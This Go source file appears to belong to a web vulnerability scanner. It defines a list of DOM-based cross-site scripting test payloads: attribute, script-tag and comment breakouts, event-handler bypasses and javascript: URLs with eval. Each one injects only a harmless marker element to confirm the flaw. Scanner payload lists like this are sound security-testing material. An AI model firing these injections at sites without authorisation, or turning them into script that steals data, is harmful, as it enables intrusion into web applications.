package payloads

type DOMXSSTest struct {
	Payload     string
	Description string
}

var DOMXSSPayloads []DOMXSSTest

func init() {
	DOMXSSPayloads = []DOMXSSTest{
		{
			Payload:     `<div id='DURSGO_DOM_XSS_MARKER'>DursgoWasHere</div>`,
			Description: "Direct HTML div injection with a trackable ID.",
		},
		{
			Payload:     `<img id="DURSGO_DOM_XSS_MARKER" src=x>`,
			Description: "Image tag injection with a trackable ID.",
		},
		{
			Payload:     `'"><img id="DURSGO_DOM_XSS_MARKER" src=x>`,
			Description: "Break out of an attribute to inject an image tag with a trackable ID.",
		},
		{
			Payload:     `</script><img id="DURSGO_DOM_XSS_MARKER" src=x>`,
			Description: "Break out of a script tag to inject an image tag.",
		},
		{
			Payload:     `<details/open/ontoggle="document.body.innerHTML+='<b id=DURSGO_DOM_XSS_MARKER></b>'"></details>`,
			Description: "Bypass using the ontoggle event to inject the proof element.",
		},
		{
			Payload:     `<svg><svg/onload="document.body.innerHTML+='<i id=DURSGO_DOM_XSS_MARKER></i>'"></svg>`,
			Description: "Triggering DOM injection via SVG onload event.",
		},
		{
			Payload:     `--><img id="DURSGO_DOM_XSS_MARKER" src=x>`,
			Description: "Break out of an HTML comment to inject an image tag.",
		},
		{
			Payload:     `javascript:document.body.innerHTML+='<marquee id=DURSGO_DOM_XSS_MARKER></marquee>'`,
			Description: "DOM injection via the javascript: protocol handler.",
		},
		{
			Payload:     `javascript:eval("document.body.innerHTML+='<div id=DURSGO_DOM_XSS_MARKER></div>'")`,
			Description: "DOM injection via javascript: protocol using eval() to create a marker element, effective for location.href sinks.",
		},
	}
}
